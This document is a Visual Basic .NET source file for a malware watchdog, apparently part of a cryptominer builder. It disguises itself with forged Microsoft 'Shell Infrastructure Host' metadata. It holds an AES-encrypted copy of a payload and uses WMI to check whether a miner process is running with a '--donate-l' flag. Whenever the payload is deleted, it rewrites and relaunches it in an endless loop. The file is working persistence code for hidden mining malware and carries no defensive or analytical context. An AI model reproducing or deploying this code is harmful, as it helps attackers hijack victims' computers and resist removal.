Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

<Assembly: AssemblyTitle("Shell Infrastructure Host")>
<Assembly: AssemblyDescription("Shell Infrastructure Host")>
<Assembly: AssemblyProduct("Microsoft® Windows® Operating System")>
<Assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")>
<Assembly: AssemblyFileVersion("10.0.19041.746")>

Public Class Watchdog

    Public Shared xm As Byte() = New Byte() {}
    Public Shared plp As String = ""
    Public Shared checkcount As Integer = 0

    Public Shared Sub Main()
        Try
            plp = PayloadPath
            xm = AES_Encryptor(System.IO.File.ReadAllBytes(plp))

            WDLoop()

        Catch ex As Exception
            Environment.Exit(0)
        End Try
    End Sub

    Public Shared Sub WDLoop()
        Try
            If Not CheckProc(GetString("#InjectionTarget"), "--donate-l") Then
                If Not System.IO.File.Exists(plp) Then
                    System.IO.File.WriteAllBytes(plp, AES_Decryptor(xm))
                    Process.Start(plp)
                Else
                    If checkcount < 2 Then
                        checkcount += 1
                    Else
                        checkcount = 0
                        Process.Start(plp)
                    End If
                End If
            Else
                checkcount = 0
                If Not System.IO.File.Exists(plp) Then
                    System.IO.File.WriteAllBytes(plp, AES_Decryptor(xm))
                    Process.Start(plp)
                End If
            End If

            If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
                System.Threading.Thread.Sleep(CInt("#STARTDELAY") * 1000 + 5000)
            Else
                System.Threading.Thread.Sleep(10000)
            End If

            WDLoop()
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function GetString(ByVal input As String)
        Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
    End Function

    Public Shared Function CheckProc(ByVal process As String, ByVal contains As String)
        On Error Resume Next
        Dim options As ConnectionOptions = New ConnectionOptions()
        options.Impersonation = ImpersonationLevel.Impersonate
        Dim scope As ManagementScope = New ManagementScope("\\" + Environment.UserDomainName + "\root\cimv2", options)
        scope.Connect()

        Dim wmiQuery As String = String.Format("Select CommandLine from Win32_Process where Name='{0}'", process)
        Dim query As ObjectQuery = New ObjectQuery(wmiQuery)
        Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
        Dim managementObjectCollection As ManagementObjectCollection = managementObjectSearcher.Get()

        For Each retObject As ManagementObject In managementObjectCollection
            If retObject("CommandLine").ToString().Contains(contains) Then
                Return True
            End If
        Next
        Return False
    End Function

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes("#IV")
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes("#SALT")
        Dim k1 As New Rfc2898DeriveBytes("#KEY", saltValueBytes, 100)
        Dim symmetricKey As New RijndaelManaged
        symmetricKey.KeySize = 256
        symmetricKey.Mode = CipherMode.CBC
        Dim decryptor As ICryptoTransform = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes)
        Using mStream As New MemoryStream()
            Using cStream As New CryptoStream(mStream, decryptor, CryptoStreamMode.Write)
                cStream.Write(input, 0, input.Length)
                cStream.Close()
            End Using
            Return mStream.ToArray()
        End Using
    End Function

    Public Shared Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes("#IV")
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes("#SALT")
        Dim k1 As New Rfc2898DeriveBytes("#KEY", saltValueBytes, 100)
        Dim symmetricKey As New RijndaelManaged
        symmetricKey.KeySize = 256
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes)
        Using mStream As New MemoryStream()
            Using cStream As New CryptoStream(mStream, encryptor, CryptoStreamMode.Write)
                cStream.Write(input, 0, input.Length)
                cStream.Close()
            End Using
            Return mStream.ToArray()
        End Using
    End Function

End Class
